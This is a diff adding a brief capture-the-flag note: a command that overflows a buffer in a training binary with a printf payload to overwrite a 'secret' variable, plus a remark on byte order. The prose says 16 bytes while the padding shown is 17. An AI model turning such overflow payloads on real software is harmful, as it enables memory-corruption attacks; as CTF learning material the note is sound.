@@ -1,0 +1,7 @@
+After writing 16 bytes, we can overwrite the secret variable.
+
+
+retep@desktop:~/ctf/cyberstart/level11/04$ ./program $(printf "xxxxxxxxxxxxxxxxx\xde\xc0\x4d\xde")
+
+
+hex bytes got reversed so do backwards
